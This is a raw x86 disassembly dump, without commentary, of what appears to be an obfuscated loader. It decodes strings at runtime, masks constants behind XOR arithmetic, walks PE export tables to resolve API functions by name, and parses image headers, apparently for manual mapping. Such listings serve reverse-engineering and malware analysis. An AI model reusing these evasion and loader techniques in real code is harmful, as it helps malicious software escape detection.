  4268bb:	mov    eax,DWORD PTR [ebp+0x8]
  4268be:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c1:	add    eax,0x14
  4268c4:	cmp    ecx,eax
  4268c6:	jne    0x426860
  4268c8:	mov    eax,DWORD PTR [ebp-0x4]
  4268cb:	xor    eax,edi
  4268cd:	add    eax,esi
  4268cf:	pop    ebx
  4268d0:	pop    edi
  4268d1:	pop    esi
  4268d2:	leave  
  4268d3:	ret    0xc
  4268d6:	mov    eax,DWORD PTR [ebp-0xc]
  4268d9:	mov    eax,DWORD PTR [eax+0x18]
  4268dc:	jmp    0x4268cf
  4268de:	push   ebp
  4268df:	mov    ebp,esp
  4268e1:	mov    eax,DWORD PTR [ebp+0xc]
  4268e4:	sub    esp,0x10
  4268e7:	cmp    DWORD PTR [ebp+0x8],0x0
  4268eb:	push   ebx
  4268ec:	push   esi
  4268ed:	push   edi
  4268ee:	je     0x4269a3
  4268f4:	test   eax,eax
  4268f6:	je     0x4269a3
  4268fc:	movzx  eax,WORD PTR [eax+0x20]
  426900:	mov    ecx,eax
  426902:	mov    DWORD PTR [ebp-0x10],eax
  426905:	xor    edx,edx
  426907:	and    DWORD PTR [ebp-0x8],edx
  42690a:	mov    eax,0x8a94
  42690f:	xor    ecx,eax
  426911:	add    ecx,0x3b56
  426917:	mov    DWORD PTR [ebp-0xc],ecx
  42691a:	and    DWORD PTR [ebp-0x4],0x0
  42691e:	xor    ecx,ecx
  426920:	push   0x7c
  426922:	pop    edi
  426923:	cmp    cx,WORD PTR [ebp-0xc]
  426927:	jae    0x42698d
  426929:	lea    esi,[edx-0x3b56]
  42692f:	xor    esi,eax
  426931:	movzx  ecx,WORD PTR [ebp-0x4]
  426935:	mov    ebx,DWORD PTR [ebp+0xc]
  426938:	lea    ecx,[ebx+ecx*4]
  42693b:	cmp    WORD PTR [ecx+0x2],si
  42693f:	jne    0x426978
  426941:	movzx  ecx,WORD PTR [ecx]
  426944:	mov    edi,0x4e3e
  426949:	cmp    cx,di
  42694c:	jne    0x42695a
  42694e:	mov    ebx,DWORD PTR [ebp+0x8]
  426951:	movzx  edi,dx
  426954:	cmp    BYTE PTR [edi+ebx*1],0x0
  426958:	je     0x426987
  42695a:	mov    ebx,DWORD PTR [ebp+0x8]
  42695d:	movzx  edi,dx
  426960:	movsx  di,BYTE PTR [edi+ebx*1]
  426965:	mov    ebx,0x3b56
  42696a:	sub    di,bx
  42696d:	xor    di,ax
  426970:	cmp    cx,di
  426973:	je     0x426987
  426975:	push   0x7a
  426977:	pop    edi
  426978:	inc    DWORD PTR [ebp-0x4]
  42697b:	mov    cx,WORD PTR [ebp-0xc]
  42697f:	cmp    WORD PTR [ebp-0x4],cx
  426983:	jb     0x426931
  426985:	jmp    0x42698d
  426987:	inc    DWORD PTR [ebp-0x8]
  42698a:	push   0x7d
  42698c:	pop    edi
  42698d:	mov    esi,DWORD PTR [ebp+0x8]
  426990:	movzx  ecx,dx
  426993:	cmp    BYTE PTR [ecx+esi*1],0x0
  426997:	je     0x4269ac
  426999:	inc    edx
  42699a:	cmp    edi,0x7a
  42699d:	jne    0x42691a
  4269a3:	xor    eax,eax
  4269a5:	pop    edi
  4269a6:	pop    esi
  4269a7:	pop    ebx
  4269a8:	leave  
  4269a9:	ret    0x8
  4269ac:	mov    ecx,DWORD PTR [ebp-0x8]
  4269af:	add    ecx,0xffffc4aa
  4269b5:	xor    cx,ax
  4269b8:	xor    eax,eax
  4269ba:	cmp    cx,WORD PTR [ebp-0x10]
  4269be:	sete   al
  4269c1:	jmp    0x4269a5
  4269c3:	push   ebp
  4269c4:	mov    ebp,esp
  4269c6:	sub    esp,0x50
  4269c9:	push   edi
  4269ca:	mov    edi,eax
  4269cc:	mov    eax,DWORD PTR [edi+0x1a8]
  4269d2:	cmp    DWORD PTR [eax],0x0
  4269d5:	jne    0x4269de
  4269d7:	xor    eax,eax
  4269d9:	jmp    0x426b0f
  4269de:	push   DWORD PTR [ebp+0x8]
  4269e1:	push   0x2c
  4269e3:	pop    eax
  4269e4:	call   0x426773
  4269e9:	mov    edx,DWORD PTR [edi+0x1ac]
  4269ef:	lea    eax,[edi+0x22]
  4269f2:	mov    DWORD PTR [ebp-0x4c],eax
  4269f5:	lea    eax,[edi+0x44]
  4269f8:	mov    DWORD PTR [ebp-0x48],eax
  4269fb:	lea    eax,[edi+0x66]
  4269fe:	mov    DWORD PTR [ebp-0x44],eax
  426a01:	lea    eax,[edi+0x88]
  426a07:	mov    DWORD PTR [ebp-0x40],eax
  426a0a:	lea    eax,[edi+0xaa]
  426a10:	mov    DWORD PTR [ebp-0x3c],eax
  426a13:	lea    eax,[edi+0xcc]
  426a19:	mov    DWORD PTR [ebp-0x38],eax
  426a1c:	lea    eax,[edi+0xee]
  426a22:	mov    DWORD PTR [ebp-0x34],eax
  426a25:	lea    eax,[edi+0x110]
  426a2b:	mov    DWORD PTR [ebp-0x30],eax
  426a2e:	lea    eax,[edi+0x132]
  426a34:	mov    DWORD PTR [ebp-0x2c],eax
  426a37:	lea    eax,[edi+0x154]
  426a3d:	push   edi
  426a3e:	mov    DWORD PTR [ebp-0x50],edi
  426a41:	mov    DWORD PTR [ebp-0x28],eax
  426a44:	call   0x426b43
  426a49:	push   eax
  426a4a:	mov    eax,DWORD PTR [edi+0x1a8]
  426a50:	push   DWORD PTR [eax]
  426a52:	call   0x4267e4
  426a57:	mov    DWORD PTR [ebp-0x10],eax
  426a5a:	test   eax,eax
  426a5c:	je     0x426b0f
  426a62:	mov    ecx,DWORD PTR [eax+0x3c]
  426a65:	push   ebx
  426a66:	push   esi
  426a67:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426a6b:	add    esi,eax
  426a6d:	mov    edi,DWORD PTR [esi+0x24]
  426a70:	mov    ecx,DWORD PTR [esi+0x1c]
  426a73:	mov    edx,DWORD PTR [esi+0x20]
  426a76:	mov    ebx,DWORD PTR [esi+0x18]
  426a79:	add    edi,eax
  426a7b:	mov    DWORD PTR [ebp-0x20],edi
  426a7e:	mov    edi,DWORD PTR [esi+0x14]
  426a81:	add    ecx,eax
  426a83:	add    edx,eax
  426a85:	mov    DWORD PTR [ebp-0xc],ecx
  426a88:	mov    DWORD PTR [ebp-0x1c],edx
  426a8b:	mov    DWORD PTR [ebp-0x8],edi
  426a8e:	cmp    edi,ebx
  426a90:	ja     0x426a95
  426a92:	mov    DWORD PTR [ebp-0x8],ebx
  426a95:	xor    ebx,ebx
  426a97:	mov    DWORD PTR [ebp-0x18],ebx
  426a9a:	cmp    DWORD PTR [ebp-0x8],ebx
  426a9d:	jbe    0x426b0d
  426a9f:	jmp    0x426aa4
  426aa1:	mov    edx,DWORD PTR [ebp-0x1c]
  426aa4:	mov    edi,DWORD PTR [ebp-0x20]
  426aa7:	movzx  edi,WORD PTR [edi+ebx*2]
  426aab:	cmp    ebx,DWORD PTR [esi+0x18]
  426aae:	jae    0x426b0d
  426ab0:	cmp    edi,DWORD PTR [esi+0x14]
  426ab3:	jae    0x426b0d
  426ab5:	mov    ebx,DWORD PTR [edx+ebx*4]
  426ab8:	mov    edx,DWORD PTR [ebp+0x8]
  426abb:	mov    edi,DWORD PTR [ecx+edi*4]
  426abe:	mov    DWORD PTR [ebp-0x4],edx
  426ac1:	lea    edx,[ebp-0x50]
  426ac4:	add    ebx,eax
  426ac6:	add    edi,eax
  426ac8:	sub    edx,DWORD PTR [ebp+0x8]
  426acb:	mov    DWORD PTR [ebp-0x14],0xb
  426ad2:	mov    DWORD PTR [ebp-0x24],edx
  426ad5:	mov    edx,DWORD PTR [ebp-0x4]
  426ad8:	cmp    DWORD PTR [edx],0x0
  426adb:	jne    0x426af8
  426add:	mov    eax,DWORD PTR [ebp-0x24]
  426ae0:	push   DWORD PTR [eax+edx*1]
  426ae3:	push   ebx
  426ae4:	call   0x4268de
  426ae9:	mov    ecx,DWORD PTR [ebp-0xc]
  426aec:	test   eax,eax
  426aee:	je     0x426af5
  426af0:	mov    eax,DWORD PTR [ebp-0x4]
  426af3:	mov    DWORD PTR [eax],edi
  426af5:	mov    eax,DWORD PTR [ebp-0x10]
  426af8:	add    DWORD PTR [ebp-0x4],0x4
  426afc:	dec    DWORD PTR [ebp-0x14]
  426aff:	jne    0x426ad5
  426b01:	mov    ebx,DWORD PTR [ebp-0x18]
  426b04:	inc    ebx
  426b05:	mov    DWORD PTR [ebp-0x18],ebx
  426b08:	cmp    ebx,DWORD PTR [ebp-0x8]
  426b0b:	jb     0x426aa1
  426b0d:	pop    esi
  426b0e:	pop    ebx
  426b0f:	pop    edi
  426b10:	leave  
  426b11:	ret    0x4
  426b14:	push   ebp
  426b15:	mov    ebp,esp
  426b17:	mov    eax,DWORD PTR [ebp+0x8]
  426b1a:	push   esi
  426b1b:	push   DWORD PTR [eax+0x1d8]
  426b21:	lea    esi,[eax+0x198]
  426b27:	mov    eax,DWORD PTR [ebp+0x8]
  426b2a:	call   0x4269c3
  426b2f:	mov    ecx,DWORD PTR [esi]
  426b31:	mov    DWORD PTR [ecx],eax
  426b33:	mov    eax,DWORD PTR [esi]
  426b35:	xor    ecx,ecx
  426b37:	cmp    DWORD PTR [eax],ecx
  426b39:	pop    esi
  426b3a:	setne  cl
  426b3d:	mov    eax,ecx
  426b3f:	pop    ebp
  426b40:	ret    0x4
  426b43:	mov    ecx,DWORD PTR [edi+0x188]
  426b49:	push   ebx
  426b4a:	jmp    0x426b5f
  426b4c:	xor    eax,0x8a94
  426b51:	add    eax,0x3b56
  426b56:	mov    WORD PTR [ecx],ax
  426b59:	add    ecx,0x2
  426b5c:	add    edx,0x2
  426b5f:	movzx  eax,WORD PTR [edx]
  426b62:	mov    ebx,0x4e3e
  426b67:	cmp    ax,bx
  426b6a:	jne    0x426b4c
  426b6c:	xor    eax,eax
  426b6e:	mov    WORD PTR [ecx],ax
  426b71:	mov    eax,DWORD PTR [edi+0x188]
  426b77:	pop    ebx
  426b78:	ret    
  426b79:	push   edi
  426b7a:	mov    edi,eax
  426b7c:	mov    eax,DWORD PTR [esi+0x188]
  426b82:	shl    edi,0x6
  426b85:	add    eax,edi
  426b87:	jmp    0x426b93
  426b89:	xor    cl,0x79
  426b8c:	sub    cl,0x3
  426b8f:	mov    BYTE PTR [eax],cl
  426b91:	inc    eax
  426b92:	inc    edx
  426b93:	mov    cl,BYTE PTR [edx]
  426b95:	cmp    cl,0x7a
  426b98:	jne    0x426b89
  426b9a:	mov    BYTE PTR [eax],0x0
  426b9d:	mov    eax,DWORD PTR [esi+0x188]
  426ba3:	add    eax,edi
  426ba5:	pop    edi
  426ba6:	ret    
  426ba7:	push   ebp
  426ba8:	mov    ebp,esp
  426baa:	sub    esp,0x14
  426bad:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  426bb4:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  426bbb:	mov    eax,DWORD PTR [ebx]
  426bbd:	mov    DWORD PTR [ebp-0x8],eax
  426bc0:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426bc7:	push   esi
  426bc8:	push   edi
  426bc9:	mov    DWORD PTR [ebp-0x14],0xead71890
  426bd0:	mov    edi,DWORD PTR [ebp-0x4]
  426bd3:	mov    ecx,DWORD PTR [ebp-0x10]
  426bd6:	mov    eax,0x75108a4
  426bdb:	xor    edi,eax
  426bdd:	mov    edx,0x3272ec
  426be2:	xor    ecx,eax
  426be4:	add    edi,edx
  426be6:	add    ecx,edx
  426be8:	imul   edi,ecx
  426beb:	jmp    0x426c33
  426bed:	mov    ecx,DWORD PTR [ebp-0x8]
  426bf0:	mov    esi,DWORD PTR [ebp-0x4]
  426bf3:	xor    ecx,eax
  426bf5:	xor    esi,eax
  426bf7:	add    ecx,edx
  426bf9:	add    esi,edx
  426bfb:	test   esi,ecx
  426bfd:	mov    esi,DWORD PTR [ebp-0x8]
  426c00:	mov    ecx,DWORD PTR [ebp-0x4]
  426c03:	je     0x426c1a
  426c05:	xor    ecx,eax
  426c07:	xor    esi,eax
  426c09:	add    ecx,edx
  426c0b:	add    esi,edx
  426c0d:	shr    esi,cl
  426c0f:	mov    ecx,DWORD PTR [ebp-0x14]
  426c12:	xor    ecx,eax
  426c14:	add    ecx,edx
  426c16:	xor    esi,ecx
  426c18:	jmp    0x426c24
  426c1a:	xor    esi,eax
  426c1c:	xor    ecx,eax
  426c1e:	add    esi,edx
  426c20:	add    ecx,edx
  426c22:	shr    esi,cl
  426c24:	mov    DWORD PTR [ebp-0x8],esi
  426c27:	mov    ecx,DWORD PTR [ebp-0x4]
  426c2a:	xor    ecx,eax
  426c2c:	lea    edi,[edi+ecx*1+0x3272ec]
  426c33:	mov    ecx,DWORD PTR [ebp-0xc]
  426c36:	mov    esi,DWORD PTR [ebp-0x4]
  426c39:	xor    esi,eax
  426c3b:	xor    ecx,eax
  426c3d:	sub    ecx,esi
  426c3f:	cmp    edi,ecx
  426c41:	jbe    0x426bed
  426c43:	mov    eax,DWORD PTR [ebp-0x8]
  426c46:	pop    edi
  426c47:	mov    DWORD PTR [ebx],eax
  426c49:	mov    eax,DWORD PTR [ebp-0x8]
  426c4c:	pop    esi
  426c4d:	leave  
  426c4e:	ret    
  426c4f:	push   ebp
  426c50:	mov    ebp,esp
  426c52:	sub    esp,0x38
  426c55:	push   ebx
  426c56:	mov    ebx,0xf89c85b0
  426c5b:	mov    DWORD PTR [ebp-0x4],ebx
  426c5e:	lea    eax,[ebx+0x1]
  426c61:	push   esi
  426c62:	mov    DWORD PTR [ebp-0x24],eax
  426c65:	mov    ecx,DWORD PTR [ebp-0x4]
  426c68:	mov    edx,DWORD PTR [ebp+0x8]
  426c6b:	mov    esi,0x75108a4
  426c70:	push   edi
  426c71:	xor    ecx,esi
  426c73:	mov    edi,0x3272ec
  426c78:	add    ecx,edi
  426c7a:	cmp    edx,ecx
  426c7c:	je     0x426de2
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	mov    edx,DWORD PTR [ebp+0xc]
  426c88:	xor    ecx,esi
  426c8a:	add    ecx,edi
  426c8c:	cmp    edx,ecx
  426c8e:	je     0x426de2
  426c94:	mov    ecx,DWORD PTR [ebp+0x10]
  426c97:	mov    DWORD PTR [ebp-0x14],ecx
  426c9a:	mov    ecx,DWORD PTR [ebp+0xc]
  426c9d:	mov    edx,DWORD PTR [ebp+0x8]
  426ca0:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  426ca7:	mov    DWORD PTR [ebp-0x1c],eax
  426caa:	mov    DWORD PTR [ebp-0x10],ebx
  426cad:	mov    DWORD PTR [ebp+0xc],eax
  426cb0:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  426cb7:	mov    eax,DWORD PTR [ebp+0xc]
  426cba:	xor    eax,esi
  426cbc:	mov    DWORD PTR [ebp-0x20],ecx
  426cbf:	sub    ecx,eax
  426cc1:	sub    ecx,edi
  426cc3:	mov    DWORD PTR [ebp+0x8],ecx
  426cc6:	mov    DWORD PTR [ebp-0xc],edx
  426cc9:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  426cd0:	jmp    0x426dd2
  426cd5:	mov    eax,DWORD PTR [ebp+0xc]
  426cd8:	mov    ecx,DWORD PTR [ebp+0xc]
  426cdb:	xor    eax,esi
  426cdd:	xor    ecx,esi
  426cdf:	lea    ecx,[eax+ecx*1+0x64e5d8]
  426ce6:	mov    eax,DWORD PTR [ebp+0x8]
  426ce9:	xor    edx,edx
  426ceb:	div    ecx
  426ced:	mov    eax,DWORD PTR [ebp+0x10]
  426cf0:	mov    ecx,DWORD PTR [ebp+0xc]
  426cf3:	xor    eax,esi
  426cf5:	xor    ecx,esi
  426cf7:	sub    eax,ecx
  426cf9:	cmp    edx,eax
  426cfb:	jne    0x426d91
  426d01:	mov    eax,DWORD PTR [ebp+0x8]
  426d04:	mov    ecx,DWORD PTR [ebp-0xc]
  426d07:	mov    dl,BYTE PTR [eax+ecx*1]
  426d0a:	mov    eax,DWORD PTR [ebp-0x10]
  426d0d:	mov    ecx,DWORD PTR [ebp-0x8]
  426d10:	xor    eax,esi
  426d12:	xor    ecx,esi
  426d14:	add    eax,edi
  426d16:	add    ecx,edi
  426d18:	cmp    eax,ecx
  426d1a:	jae    0x426d62
  426d1c:	lea    ecx,[eax-0x3272ec]
  426d22:	mov    DWORD PTR [ebp-0x4],ecx
  426d25:	mov    ebx,DWORD PTR [ebp-0x4]
  426d28:	xor    ebx,esi
  426d2a:	add    ebx,0x7f55d8f2
  426d30:	lea    ecx,[ebp+eax*4-0x38]
  426d34:	mov    DWORD PTR [ecx],ebx
  426d36:	mov    ebx,DWORD PTR [ecx]
  426d38:	cmp    ebx,0x244ecb93
  426d3e:	jbe    0x426d48
  426d40:	add    DWORD PTR [ecx],0x405fcdc
  426d46:	jmp    0x426d4e
  426d48:	add    DWORD PTR [ecx],0xfdaf4324
  426d4e:	mov    ecx,DWORD PTR [ebp-0x8]
  426d51:	xor    ecx,esi
  426d53:	inc    eax
  426d54:	inc    DWORD PTR [ebp-0x4]
  426d57:	add    ecx,edi
  426d59:	cmp    eax,ecx
  426d5b:	jb     0x426d25
  426d5d:	mov    ebx,0xf89c85b0
  426d62:	cmp    DWORD PTR [ebp-0x14],0x0
  426d66:	jne    0x426d70
  426d68:	xor    dl,0x79
  426d6b:	sub    dl,0x3
  426d6e:	jmp    0x426d86
  426d70:	mov    eax,DWORD PTR [ebp-0x18]
  426d73:	xor    al,0xa4
  426d75:	mov    cl,0x14
  426d77:	sub    cl,al
  426d79:	add    dl,cl
  426d7b:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d7e:	xor    cl,0xa4
  426d81:	sub    cl,0x14
  426d84:	ror    dl,cl
  426d86:	xor    eax,eax
  426d88:	mov    eax,DWORD PTR [ebp+0x8]
  426d8b:	mov    ecx,DWORD PTR [ebp-0xc]
  426d8e:	mov    BYTE PTR [eax+ecx*1],dl
  426d91:	mov    eax,DWORD PTR [ebp+0x8]
  426d94:	mov    ecx,DWORD PTR [ebp-0x10]
  426d97:	sub    eax,edi
  426d99:	xor    eax,esi
  426d9b:	cmp    eax,ecx
  426d9d:	jne    0x426dc0
  426d9f:	mov    eax,DWORD PTR [ebp+0x10]
  426da2:	mov    ecx,DWORD PTR [ebp+0xc]
  426da5:	xor    eax,esi
  426da7:	xor    ecx,esi
  426da9:	sub    eax,ecx
  426dab:	mov    ecx,DWORD PTR [ebp-0x20]
  426dae:	sub    eax,edi
  426db0:	xor    eax,esi
  426db2:	mov    DWORD PTR [ebp+0x10],eax
  426db5:	mov    eax,DWORD PTR [ebp+0xc]
  426db8:	xor    eax,esi
  426dba:	sub    ecx,eax
  426dbc:	sub    ecx,edi
  426dbe:	jmp    0x426dcf
  426dc0:	mov    eax,DWORD PTR [ebp+0xc]
  426dc3:	xor    eax,esi
  426dc5:	mov    ecx,0xffcd8d14
  426dca:	sub    ecx,eax
  426dcc:	add    ecx,DWORD PTR [ebp+0x8]
  426dcf:	mov    DWORD PTR [ebp+0x8],ecx
  426dd2:	mov    eax,DWORD PTR [ebp+0x10]
  426dd5:	cmp    eax,ebx
  426dd7:	jne    0x426cd5
  426ddd:	mov    eax,DWORD PTR [ebp-0x24]
  426de0:	jmp    0x426de5
  426de2:	mov    eax,DWORD PTR [ebp-0x4]
  426de5:	xor    eax,esi
  426de7:	add    eax,edi
  426de9:	pop    edi
  426dea:	pop    esi
  426deb:	pop    ebx
  426dec:	leave  
  426ded:	ret    0xc
  426df0:	push   ebp
  426df1:	mov    ebp,esp
  426df3:	sub    esp,0x420
  426df9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  426e00:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  426e07:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  426e0e:	push   ebx
  426e0f:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  426e16:	mov    eax,DWORD PTR [ebp-0x14]
  426e19:	push   esi
  426e1a:	mov    esi,0x75108a4
  426e1f:	push   edi
  426e20:	xor    eax,esi
  426e22:	mov    edi,0x3272ec
  426e27:	add    eax,edi
  426e29:	mov    DWORD PTR [ebp-0x8],eax
  426e2c:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  426e33:	mov    DWORD PTR [ebp-0x4],0xead71890
  426e3a:	mov    DWORD PTR [ebp-0x10],0x8
  426e41:	mov    ecx,ecx
  426e43:	mov    eax,DWORD PTR [ebp-0xc]
  426e46:	mov    ecx,DWORD PTR [ebp-0x14]
  426e49:	xor    eax,esi
  426e4b:	xor    ecx,esi
  426e4d:	add    eax,edi
  426e4f:	add    ecx,edi
  426e51:	imul   eax,ecx
  426e54:	jmp    0x426e87
  426e56:	mov    eax,DWORD PTR [ebp-0x4]
  426e59:	sub    eax,edi
  426e5b:	xor    eax,esi
  426e5d:	mov    DWORD PTR [ebp-0x8],eax
  426e60:	lea    ebx,[ebp-0x8]
  426e63:	call   0x426ba7
  426e68:	mov    DWORD PTR [ebp-0x8],eax
  426e6b:	mov    eax,DWORD PTR [ebp-0x8]
  426e6e:	mov    ecx,DWORD PTR [ebp-0x4]
  426e71:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  426e78:	mov    eax,DWORD PTR [ebp-0xc]
  426e7b:	mov    ecx,DWORD PTR [ebp-0x4]
  426e7e:	xor    eax,esi
  426e80:	lea    eax,[eax+ecx*1+0x3272ec]
  426e87:	mov    DWORD PTR [ebp-0x4],eax
  426e8a:	mov    eax,DWORD PTR [ebp-0x18]
  426e8d:	mov    ecx,DWORD PTR [ebp-0xc]
  426e90:	xor    ecx,esi
  426e92:	xor    eax,esi
  426e94:	sub    eax,ecx
  426e96:	mov    ecx,DWORD PTR [ebp-0x4]
  426e99:	cmp    ecx,eax
  426e9b:	jbe    0x426e56
  426e9d:	mov    eax,DWORD PTR [ebp-0x1c]
  426ea0:	xor    eax,esi
  426ea2:	add    eax,edi
  426ea4:	mov    DWORD PTR [ebp-0x8],eax
  426ea7:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  426eae:	mov    ebx,ebx
  426eb0:	jmp    0x426f13
  426eb2:	mov    ecx,DWORD PTR [ebp-0x20]
  426eb5:	mov    eax,DWORD PTR [ebp-0x8]
  426eb8:	xor    ecx,esi
  426eba:	add    ecx,edi
  426ebc:	shr    eax,cl
  426ebe:	mov    DWORD PTR [ebp-0x4],eax
  426ec1:	mov    eax,DWORD PTR [ebp+0x8]
  426ec4:	mov    cl,BYTE PTR [eax]
  426ec6:	mov    BYTE PTR [ebp+0xb],cl
  426ec9:	mov    cl,BYTE PTR [ebp+0xb]
  426ecc:	mov    edx,DWORD PTR [ebp-0x8]
  426ecf:	movzx  ecx,cl
  426ed2:	xor    ecx,edx
  426ed4:	mov    DWORD PTR [ebp+0x8],ecx
  426ed7:	mov    ecx,DWORD PTR [ebp-0x18]
  426eda:	mov    edx,DWORD PTR [ebp+0x8]
  426edd:	xor    ecx,esi
  426edf:	add    ecx,edi
  426ee1:	and    ecx,edx
  426ee3:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  426eea:	mov    edx,DWORD PTR [ebp-0x4]
  426eed:	xor    ecx,edx
  426eef:	mov    DWORD PTR [ebp-0x8],ecx
  426ef2:	mov    ecx,DWORD PTR [ebp-0xc]
  426ef5:	xor    ecx,esi
  426ef7:	lea    eax,[eax+ecx*1+0x3272ec]
  426efe:	mov    DWORD PTR [ebp+0x8],eax
  426f01:	mov    eax,DWORD PTR [ebp-0xc]
  426f04:	xor    eax,esi
  426f06:	mov    ecx,0xffcd8d14
  426f0b:	sub    ecx,eax
  426f0d:	add    ecx,DWORD PTR [ebp-0x10]
  426f10:	mov    DWORD PTR [ebp-0x10],ecx
  426f13:	mov    eax,DWORD PTR [ebp-0x14]
  426f16:	mov    ecx,DWORD PTR [ebp-0x10]
  426f19:	xor    eax,esi
  426f1b:	add    eax,edi
  426f1d:	cmp    ecx,eax
  426f1f:	jne    0x426eb2
  426f21:	mov    eax,DWORD PTR [ebp-0x1c]
  426f24:	mov    ecx,DWORD PTR [ebp-0x8]
  426f27:	xor    eax,esi
  426f29:	add    eax,edi
  426f2b:	pop    edi
  426f2c:	pop    esi
  426f2d:	xor    eax,ecx
  426f2f:	pop    ebx
  426f30:	leave  
  426f31:	ret    0x4
  426f34:	push   ebp
  426f35:	mov    ebp,esp
  426f37:	mov    eax,DWORD PTR [ebp+0x1c]
  426f3a:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3d:	mov    edx,DWORD PTR [ebp+0x10]
  426f40:	mov    eax,DWORD PTR [eax+0x190]
  426f46:	mov    eax,DWORD PTR [eax]
  426f48:	sub    esp,0x64
  426f4b:	push   ebx
  426f4c:	push   esi
  426f4d:	push   edi
  426f4e:	mov    edi,0x75108a4
  426f53:	xor    ecx,edi
  426f55:	mov    ebx,0x3272ec
  426f5a:	add    ecx,ebx
  426f5c:	cmp    ecx,edx
  426f5e:	jne    0x426f6f
  426f60:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  426f6a:	jmp    0x42746b
  426f6f:	mov    ecx,DWORD PTR [ebp+0x8]
  426f72:	mov    esi,DWORD PTR [ebp+0x14]
  426f75:	mov    edx,DWORD PTR [esi]
  426f77:	xor    ecx,edi
  426f79:	add    ecx,ebx
  426f7b:	cmp    edx,ecx
  426f7d:	je     0x427426
  426f83:	mov    ecx,DWORD PTR [ebp+0x1c]
  426f86:	mov    DWORD PTR [ebp-0x1c],eax
  426f89:	mov    DWORD PTR [ebp+0x1c],ecx
  426f8c:	mov    ecx,DWORD PTR [ebp+0x18]
  426f8f:	mov    eax,DWORD PTR [esi]
  426f91:	mov    DWORD PTR [ebp-0x20],eax
  426f94:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  426f9b:	mov    edx,0xf89c85b1
  426fa0:	mov    DWORD PTR [ebp-0x8],edx
  426fa3:	mov    eax,DWORD PTR [ebp+0x1c]
  426fa6:	mov    DWORD PTR [ebp+0x1c],eax
  426fa9:	mov    eax,DWORD PTR [ebp+0x1c]
  426fac:	mov    eax,DWORD PTR [eax+0x190]
  426fb2:	mov    eax,DWORD PTR [eax]
  426fb4:	mov    DWORD PTR [ebp-0x24],ecx
  426fb7:	mov    ecx,DWORD PTR [ebp+0x1c]
  426fba:	mov    ecx,DWORD PTR [ecx+0x190]
  426fc0:	mov    ecx,DWORD PTR [ecx]
  426fc2:	add    ecx,DWORD PTR [eax+0x3c]
  426fc5:	mov    DWORD PTR [ebp+0x10],ecx
  426fc8:	mov    eax,DWORD PTR [ebp+0x8]
  426fcb:	xor    eax,edi
  426fcd:	add    eax,ebx
  426fcf:	mov    DWORD PTR [ebp-0x4],eax
  426fd2:	mov    eax,DWORD PTR [ebp+0x8]
  426fd5:	xor    eax,edi
  426fd7:	add    eax,ebx
  426fd9:	mov    DWORD PTR [ebp+0x18],eax
  426fdc:	mov    eax,DWORD PTR [ebp+0x10]
  426fdf:	mov    eax,DWORD PTR [eax+0x50]
  426fe2:	sub    eax,0xc
  426fe5:	mov    DWORD PTR [ebp-0x28],eax
  426fe8:	mov    eax,DWORD PTR [ebp+0x10]
  426feb:	mov    eax,DWORD PTR [eax+0x38]
  426fee:	mov    ecx,DWORD PTR [ebp+0x10]
  426ff1:	dec    eax
  426ff2:	test   DWORD PTR [ecx+0x54],eax
  426ff5:	mov    eax,DWORD PTR [ebp+0x10]
  426ff8:	je     0x427012
  426ffa:	mov    eax,DWORD PTR [eax+0x38]
  426ffd:	mov    ecx,DWORD PTR [ebp+0x10]
  427000:	mov    ecx,DWORD PTR [ecx+0x54]
  427003:	dec    eax
  427004:	not    eax
  427006:	and    ecx,eax
  427008:	mov    eax,DWORD PTR [ebp+0x10]
  42700b:	mov    eax,DWORD PTR [eax+0x38]
  42700e:	add    eax,ecx
  427010:	jmp    0x427015
  427012:	mov    eax,DWORD PTR [eax+0x54]
  427015:	mov    DWORD PTR [ebp+0x1c],eax
  427018:	mov    eax,DWORD PTR [ebp+0x8]
  42701b:	xor    eax,edi
  42701d:	add    eax,ebx
  42701f:	mov    DWORD PTR [ebp+0x18],eax
  427022:	mov    eax,DWORD PTR [ebp+0x8]
  427025:	xor    eax,edi
  427027:	add    eax,ebx
  427029:	mov    DWORD PTR [ebp+0x18],eax
  42702c:	mov    eax,DWORD PTR [ebp+0x8]
  42702f:	mov    ecx,DWORD PTR [ebp-0x24]
  427032:	xor    eax,edi
  427034:	add    eax,ebx
  427036:	mov    DWORD PTR [ecx],eax
  427038:	mov    DWORD PTR [ebp+0x18],edx
  42703b:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427042:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427049:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427050:	mov    eax,DWORD PTR [ebp-0x8]
  427053:	mov    ecx,DWORD PTR [ebp+0x1c]
  427056:	xor    eax,edi
  427058:	add    eax,ebx
  42705a:	imul   eax,ecx
  42705d:	mov    ecx,DWORD PTR [ebp+0x8]
  427060:	mov    edx,DWORD PTR [ebp-0x28]
  427063:	xor    ecx,edi
  427065:	lea    ecx,[ecx+edx*1+0x3272ec]
  42706c:	cmp    eax,ecx
  42706e:	jae    0x42741f
  427074:	mov    eax,DWORD PTR [ebp+0x8]
  427077:	xor    eax,edi
  427079:	add    eax,ebx
  42707b:	mov    DWORD PTR [ebp+0x18],eax
  42707e:	mov    eax,DWORD PTR [ebp+0x1c]
  427081:	add    eax,DWORD PTR [ebp-0x1c]
  427084:	mov    DWORD PTR [ebp-0x4],eax
  427087:	push   DWORD PTR [ebp-0x4]
  42708a:	mov    esi,DWORD PTR [ebp-0x1c]
  42708d:	mov    ecx,DWORD PTR [ebp+0x10]
  427090:	call   0x4261df
